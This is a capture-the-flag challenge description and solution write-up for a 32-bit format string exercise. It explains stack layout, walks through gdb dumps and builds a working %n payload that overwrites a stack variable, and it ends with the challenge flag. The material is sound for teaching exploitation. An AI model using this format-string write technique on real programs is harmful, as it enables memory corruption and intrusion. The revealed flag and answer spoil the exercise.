# Magician 2

## Question Text

I got inspired by PotatoDrug's magic show, so I made my own.

You may need 32 bit libraries for this on 64-bit machines! `apt-get install libc6-i386`

Or use whatever command you would to get the 32-bit libs...

`nc pwn.chal.gryphonctf.com 18156`

*Creator - @IncompetentDev*

### Hints

1. Wonder what the whispering voice was about. Maybe it tells me about where the secret number is stored?
2. The magic of (%d or %x) and %n to get a new number...

## Setup Guide

1. Build binaries: `make` in generate
    - Distributes binaries to distrib and service
2. Build docker image: `./build.sh` in service
3. Run docker image: `./run.sh` in service

## Distribution
- magic2.c
    - SHA1: 45075a9643f1213c461840380bc6656942f77886
    - Source code for magic2
    
- magic2-distrib
    - SHA1: 74c646a5cba3d98b34dc0e6e34c88cf1ce12851e  
    - ELF 32-bit LSB executable 

## Solution

This problem requires a firm grasp of memory structure (how programs use memory, specifically the stack).

This problem also requires intimate knowledge on format string attacks. 

<details>
    <summary>
   	 **Stack Explanation**
    </summary>
	
  ![logo](https://i.stack.imgur.com/zgw0O.png)

  1. Programs store data on stack (resides on RAM). Each program may have different functions; and each function has a memory  structure resembling that of the image. For this problem, we are looking specifically at the stack frame for pwn(), where fixed-size variables are stored.


      int secretnum = (rand() % 1000000) + 1000000;
      char buf[sizeOfBuf];
  2. `secretnum` and `buf` are two such fixed-size variables that are stored onto the stack. Our goal is to override `secretnum` using the format string vulnerability present to get a value of 50. (Covered later)
</details>

<details>
	<summary>
    	**Format String attacks**
    </summary>

This attack are commonly executed against `printf` statements (or equivalent "Format Functions" eg `sprintf`), when inputs are passed in directly as an argument to the format function. (eg `char str[20]="%d%d%d"; printf(str);` which results in `printf("%d%d%d");` )

What usually happens with a format function is that it pushes its arguments to the top of the stack. For example, `int num=5; printf("%d, num");` would push 5 to the top of the stack, and `%d` tells the printf function to look through the top 32 bits (a 4 byte integer, which is what `%d` represents) and use that as the value to print. In this case, it would be 5.

Omitting the `num` argument to `printf` would still result in printf searching through the 4 bytes of the stack. However, the number 5 is not pushed to the stack. This results in printf returning whatever is currently at the top of the stack, allowing an attacker to read arbitrary values.

Subsequent `%d` tokens would allow an attacker to continue reading down the stack, so for example `%d%d` would read 2 integers, or 8 bytes worth of data.

Also notable is the `%n` token in `printf()`, which will read 4 bytes of data from the stack and interpret it as a memory address, instead of a value(which `%d` does). `%n` writes the number of characters printed by the `printf()` function to the address derived from the stack . For example, if `%n` reads in `0xffffd8d8` as the next 4 bytes, and `printf()` printed "asdasdasd", it would write the value 9 into the memory address 0xffffd8d8.
</details>

<details>
	<summary>
		**Exploitation**
    </summary>
    

With these two pieces of information, exploitation is now possible.

When first connecting to the program, the following message appears.

    nc 127.0.0.1 18156
    Prove to me magicians can read minds!
    Before you start, please tell me your name (256 chars max): 
    (psst, this aint no magic trick, he's tricky!) 0xffffdd24

Notable is the `0xffffdd24` value printed (**NOTE: ASLR ENABLED ON SERVER(in competition). FEEL FREE TO DISABLE, BUT IN THAT CASE WATCH OUT FOR ENV VARIABLES. YOU CAN DISABLE ASLR AND TRY TO EXPLOIT, MAY HELP UNDERSTANDING**). It corresponds to a memory address! Looking at the source code, there is a line:

    printf("(psst, this aint no magic trick, he's tricky!) %p\n",&secretnum);
	
This shows the address of `secretnum`! This will be useful later.

Inspecting the code, we also find these lines of interest:
    
    //get input
	fgets(buf, sizeOfBuf, stdin);
	
	//concat str
	strcat(buf, "'s prediction: "); 
	
	//print user's name + concat string
	printf(buf);

There is a format string vulnerability here! Users can enter any input into the char array `buf` which is passed into `printf` as an argument. A user could enter `%d%d%d` and pass it in as an argument to `printf`, effectively doing `printf("%d%d%d")`.

Now would be a good time to inspect what the stack looks like when the program is running. Load up the trusty `gdb`.

<details>
	<summary>
    	`GDB dump`
    </summary>
    
	gdb magic2-distrib
    GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
    Copyright (C) 2016 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
    and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from magic2-distrib...(no debugging symbols found)...done.
    (gdb) disas *pwn
    Dump of assembler code for function pwn:
    0x08048608 <+0>:	push   %ebp
    0x08048609 <+1>:	mov    %esp,%ebp
    0x0804860b <+3>:	push   %edi
    0x0804860c <+4>:	push   %esi
    0x0804860d <+5>:	push   %ebx
    0x0804860e <+6>:	sub    $0x2c,%esp
    0x08048611 <+9>:	mov    %esp,%eax
    0x08048613 <+11>:	mov    %eax,%esi
    0x08048615 <+13>:	sub    $0xc,%esp
    0x08048618 <+16>:	push   $0x0
    0x0804861a <+18>:	call   0x8048430 <time@plt>
    0x0804861f <+23>:	add    $0x10,%esp
    0x08048622 <+26>:	sub    $0xc,%esp
    0x08048625 <+29>:	push   %eax
    0x08048626 <+30>:	call   0x8048460 <srand@plt>
    0x0804862b <+35>:	add    $0x10,%esp
    0x0804862e <+38>:	call   0x8048490 <rand@plt>
    0x08048633 <+43>:	mov    %eax,%ecx
    0x08048635 <+45>:	mov    $0x431bde83,%edx
    0x0804863a <+50>:	mov    %ecx,%eax
    0x0804863c <+52>:	imul   %edx
    0x0804863e <+54>:	sar    $0x12,%edx
    ---Type <return> to continue, or q <return> to quit---
    0x08048641 <+57>:	mov    %ecx,%eax
    0x08048643 <+59>:	sar    $0x1f,%eax
    0x08048646 <+62>:	sub    %eax,%edx
    0x08048648 <+64>:	mov    %edx,%eax
    0x0804864a <+66>:	imul   $0xf4240,%eax,%eax
    0x08048650 <+72>:	sub    %eax,%ecx
    0x08048652 <+74>:	mov    %ecx,%eax
    0x08048654 <+76>:	add    $0xf4240,%eax
    0x08048659 <+81>:	mov    %eax,-0x24(%ebp)
    0x0804865c <+84>:	sub    $0x8,%esp
    0x0804865f <+87>:	lea    -0x24(%ebp),%eax
    0x08048662 <+90>:	push   %eax
    0x08048663 <+91>:	push   $0x804887c
    0x08048668 <+96>:	call   0x8048410 <printf@plt>
    0x0804866d <+101>:	add    $0x10,%esp
    0x08048670 <+104>:	mov    $0x100,%eax
    0x08048675 <+109>:	sub    $0x1,%eax
    0x08048678 <+112>:	mov    %eax,-0x1c(%ebp)
    0x0804867b <+115>:	mov    $0x100,%eax
    0x08048680 <+120>:	mov    %eax,%edx
    0x08048682 <+122>:	mov    $0x10,%eax
    0x08048687 <+127>:	sub    $0x1,%eax
    0x0804868a <+130>:	add    %edx,%eax
    ---Type <return> to continue, or q <return> to quit---
    0x0804868c <+132>:	mov    $0x10,%ebx
    0x08048691 <+137>:	mov    $0x0,%edx
    0x08048696 <+142>:	div    %ebx
    0x08048698 <+144>:	imul   $0x10,%eax,%eax
    0x0804869b <+147>:	sub    %eax,%esp
    0x0804869d <+149>:	mov    %esp,%eax
    0x0804869f <+151>:	add    $0x0,%eax
    0x080486a2 <+154>:	mov    %eax,-0x20(%ebp)
    0x080486a5 <+157>:	mov    0x804a040,%edx
    0x080486ab <+163>:	mov    $0x100,%ecx
    0x080486b0 <+168>:	mov    -0x20(%ebp),%eax
    0x080486b3 <+171>:	sub    $0x4,%esp
    0x080486b6 <+174>:	push   %edx
    0x080486b7 <+175>:	push   %ecx
    0x080486b8 <+176>:	push   %eax
    0x080486b9 <+177>:	call   0x8048420 <fgets@plt>
    0x080486be <+182>:	add    $0x10,%esp
    0x080486c1 <+185>:	mov    -0x20(%ebp),%edx
    0x080486c4 <+188>:	mov    %edx,%eax
    0x080486c6 <+190>:	mov    $0xffffffff,%ecx
    0x080486cb <+195>:	mov    %eax,%ebx
    0x080486cd <+197>:	mov    $0x0,%eax
    0x080486d2 <+202>:	mov    %ebx,%edi
    ---Type <return> to continue, or q <return> to quit---
    0x080486d4 <+204>:	repnz scas %es:(%edi),%al
    0x080486d6 <+206>:	mov    %ecx,%eax
    0x080486d8 <+208>:	not    %eax
    0x080486da <+210>:	sub    $0x1,%eax
    0x080486dd <+213>:	add    %edx,%eax
    0x080486df <+215>:	movl   $0x70207327,(%eax)
    0x080486e5 <+221>:	movl   $0x69646572,0x4(%eax)
    0x080486ec <+228>:	movl   $0x6f697463,0x8(%eax)
    0x080486f3 <+235>:	movl   $0x203a6e,0xc(%eax)
    0x080486fa <+242>:	sub    $0xc,%esp
    0x080486fd <+245>:	push   $0x80488b0
    0x08048702 <+250>:	call   0x8048440 <puts@plt>
    0x08048707 <+255>:	add    $0x10,%esp
    0x0804870a <+258>:	mov    -0x20(%ebp),%eax
    0x0804870d <+261>:	sub    $0xc,%esp
    0x08048710 <+264>:	push   %eax
    0x08048711 <+265>:	call   0x8048410 <printf@plt>
    0x08048716 <+270>:	add    $0x10,%esp
    0x08048719 <+273>:	mov    0x804a040,%eax
    0x0804871e <+278>:	sub    $0x4,%esp
    0x08048721 <+281>:	push   %eax
    0x08048722 <+282>:	push   $0x8
    0x08048724 <+284>:	lea    -0x2c(%ebp),%eax
    ---Type <return> to continue, or q <return> to quit---
    0x08048727 <+287>:	push   %eax
    0x08048728 <+288>:	call   0x8048420 <fgets@plt>
    0x0804872d <+293>:	add    $0x10,%esp
    0x08048730 <+296>:	mov    -0x24(%ebp),%eax
    0x08048733 <+299>:	cmp    $0x32,%eax
    0x08048736 <+302>:	jne    0x804873f <pwn+311>
    0x08048738 <+304>:	call   0x804875e <win>
    0x0804873d <+309>:	jmp    0x8048753 <pwn+331>
    0x0804873f <+311>:	mov    -0x24(%ebp),%eax
    0x08048742 <+314>:	sub    $0x8,%esp
    0x08048745 <+317>:	push   %eax
    0x08048746 <+318>:	push   $0x80488fc
    0x0804874b <+323>:	call   0x8048410 <printf@plt>
    0x08048750 <+328>:	add    $0x10,%esp
    0x08048753 <+331>:	mov    %esi,%esp
    0x08048755 <+333>:	nop
    0x08048756 <+334>:	lea    -0xc(%ebp),%esp
    0x08048759 <+337>:	pop    %ebx
    0x0804875a <+338>:	pop    %esi
    0x0804875b <+339>:	pop    %edi
    0x0804875c <+340>:	pop    %ebp
    0x0804875d <+341>:	ret    
    End of assembler dump.
    (gdb) 
    (gdb) break *pwn+265
    Breakpoint 1 at 0x8048711
    (gdb) run
    Starting program: /home/kht/Desktop/GCTFLite/GryphonCTF2018-Lite-Challenges/challenges/pwn/Magician2/distrib/magic2-distrib 
    Prove to me magicians can read minds!
    Before you start, please tell me your name (256 chars max): 
    (psst, this aint no magic trick, he's tricky!) 0xffffcf54				<----- this address is going to be different everytime because of ASLR or environment variables
    %d %d %d %d %d %d      
    I'm thinking of a random number (0 to 1000000), can you tell me what it is?

    Breakpoint 1, 0x08048711 in pwn ()
    (gdb) x/10dw $esp
    0xffffce30:	-12736	256	-134519392	0
    0xffffce40:	622879781	1680154724	543434016	622879781
    0xffffce50:	1931938404	1701998624
    (gdb) c
    Continuing.
    256 -134519392 0 622879781 1680154724 543434016
    's prediction:


</details>

This section of `gdb's` output should be examined more closely:
 
<details>
	<summary>
    	`GDB dump`
    </summary>
    
 
    (gdb) break *pwn+265 			<-------------------------------------------- note: printf(buf) statement
    Breakpoint 1 at 0x8048711
    (gdb) run
    Starting program: /home/kht/Desktop/GCTFLite/GryphonCTF2018-Lite-Challenges/challenges/pwn/Magician2/distrib/magic2-distrib 
    Prove to me magicians can read minds!
    Before you start, please tell me your name (256 chars max): 
    (psst, this aint no magic trick, he's tricky!) 0xffffcf54
    %d %d %d %d %d %d      
    I'm thinking of a random number (0 to 1000000), can you tell me what it is?

    Breakpoint 1, 0x08048711 in pwn ()
    (gdb) x/10dw $esp
    0xffffce30:	-12736	256	-134519392	0
    0xffffce40:	622879781	1680154724	543434016	622879781
    0xffffce50:	1931938404	1701998624
    (gdb) c
    Continuing.
    256 -134519392 0 622879781 1680154724 543434016
    's prediction:
    

</details>
    
    
Using `gdb` to stop the program before the `printf()` statement was executed, the stack was examined with `x/10dw $esp`, which prints the first 10 integers off the top of the stack. After the `printf()` statement executed, it was found that the values `256`, `-134519392` and so on corresponded with the 6 `%d` tokens.

This proves a format string vulnerability, but what input would be required to change the address of `secretnum`?

Turns out, the `buf` char array is stored in the stack starting at the address `0xffffce430` (Notice the repeated 0x73 hex values, which is the hex value for the character `s`)
<details>
	<summary>
    	`GDB dump`
    </summary>
    
	(gdb) run
	The program being debugged has been started already.
	Start it from the beginning? (y or n) y
	Starting program: /home/kht/Desktop/GCTFLite/GryphonCTF2018-Lite-Challenges/challenges/pwn/Magician2/distrib/magic2-distrib 
	Prove to me magicians can read minds!
	Before you start, please tell me your name (256 chars max): 
	(psst, this aint no magic trick, he's tricky!) 0xffffcf54
	sssssssssssssssssssssssssssssssssssssssssssssssssss
	I'm thinking of a random number (0 to 1000000), can you tell me what it is?

	Breakpoint 1, 0x08048711 in pwn ()
	(gdb) x/40x $esp
	0xffffce30:	0xffffce40	0x00000100	0xf7fb65a0	0x00000000
	0xffffce40:	0x73737373	0x73737373	0x73737373	0x73737373
	0xffffce50:	0x73737373	0x73737373	0x73737373	0x73737373
	0xffffce60:	0x73737373	0x73737373	0x73737373	0x73737373
	0xffffce70:	0x0a737373	0x70207327	0x69646572	0x6f697463
	0xffffce80:	0x00203a6e	0xf7ffd918	0xffffcea0	0x080482e8
	0xffffce90:	0x00000000	0xf7fd8170	0x00000000	0x00000000
	0xffffcea0:	0xf7fe3a70	0x08048248	0xf7e35371	0xf7fb6000
	0xffffceb0:	0xf7fe3a70	0x08048278	0x00000001	0xf7ffd918
	0xffffcec0:	0x0804a02c	0xf7fe88a2	0xf7ffdad0	0xf7fd4490


</details>


Now the value of `secretnum` at the address `0xffffdd24` must be overwritten to get the flag.

The value of the address `0xffffdd24` must be pushed onto the stack (through the `buf` char array) to accomplish that. Typing the address in little endian format as input: `\x24\xdd\xff\xff`, where `\x` represents a hexadecimal value with the following two characters representing the hex value, the address value can be written onto the stack.

Next, `%n` must read this address so it writes to this portion. Hence, 4 preceding `%d` tokens must be added to allow `%n` to read the address. The current input should now be `\x24\xdd\xff\xff%d%d%d%d%n`. This prints:

	$���256-1344251840

The 2nd, 3rd and 4th characters are not valid ASCII characters, hence showing a "?" or something not visible. This prints a total of 18 characters. If input into the program, we find that we get the output:

	I'm thinking of a random number (0 to 1000000), can you tell me what it is?
	$���256-1344251840
	's prediction: HA! the answer was 18 see I knew you couldn't read my mind.

Almost done! The actual server has ASLR running, which changes `secretnum`'s address. Get the value of the address given by the program, then adapt your attack input accordingly. `printf()` also needs to print a total of 50 characters to write the value 50 to `secretnum`.

One of the ways to force `printf()` to print more characters easily would be to specify the precision for the printf token. We can use the following:

`"\x24\xdd\xff\xff%016d%016d%014d%n"`

4+16+16+14=50

To print the appropriate output, `python3` can be used. 

Python 3: `python3 -c "print("\x24\xdd\xff\xff%016d%016d%014d%n")" > attack` **NOTE: NOT SOLUTION, ITS AN EXAMPLE WITH ASLR DISABLED ON A PARTICUALR ENVIRONMENT**

Direct the contents of the `attack` file into the program stdin to get the flag.

	kht@ubuntu:~/Desktop/GCTFLite/GryphonCTF2018-Lite-Challenges/challenges/pwn/Magician2/solution$ nc 127.0.0.1 18156 < ./attack1
	Prove to me magicians can read minds!
	Before you start, please tell me your name (256 chars max): 
	(psst, this aint no magic trick, he's tricky!) 0xffffdd24
	I'm thinking of a random number (0 to 1000000), can you tell me what it is?
	$���0000000000000256-00000013442518400000000000000
	's prediction: Magic??
	GCTF{unl1k3ly_y0ull_us3_th15_0uts1d3_0f_ctf5}

Actual solution is in solutions folder. Run with python3. It connects to the server and adds the address into the payload accordingly. (recv() may be faulty, in that case try again.)

    kht@ubuntu:~/Desktop/GCTFLite/GryphonCTF2018-Lite-Challenges/challenges/pwn/Magician2/solution$ python3 solution.py
    I'm thinking of a random number (0 to 1000000), can you tell me what it is?
    b"\n4g\xe2\xff0000000000000256-00000013483478400000000000000\n's prediction: "
    b'Magic??\nGCTF{unl1k3ly_y0ull_us3_th15_0uts1d3_0f_ctf5}\n'

</details>

### Flag
`GCTF{unl1k3ly_y0ull_us3_th15_0uts1d3_0f_ctf5}`

## Recommended Reads

* https://bitvijays.github.io/LFC-BinaryExploitation.html#format-string-vulnerability

